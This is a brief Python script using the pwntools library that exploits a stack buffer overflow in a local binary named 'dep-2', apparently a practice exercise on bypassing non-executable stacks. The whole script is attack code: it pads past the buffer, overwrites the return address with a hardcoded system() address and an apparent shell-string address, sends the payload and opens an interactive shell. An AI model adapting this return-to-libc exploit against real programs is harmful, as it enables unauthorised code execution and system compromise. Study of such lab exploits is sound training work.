#!/usr/bin/env python

from pwn import *
import os
import sys

context.terminal = ["tmux", "splitw", "-h"]
p = process('./dep-2')
#gdb.attach(p)

#sys_addr_auto = e.symbols["some_function"]

sys_addr_man = p32(0xf7e39da0)

buf = "A" * 0x88 + "BBBB" + sys_addr_man + "C" * 0x4 + p32(0xf7f5aa0b)

if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')



p.sendline(buf)

p.interactive()
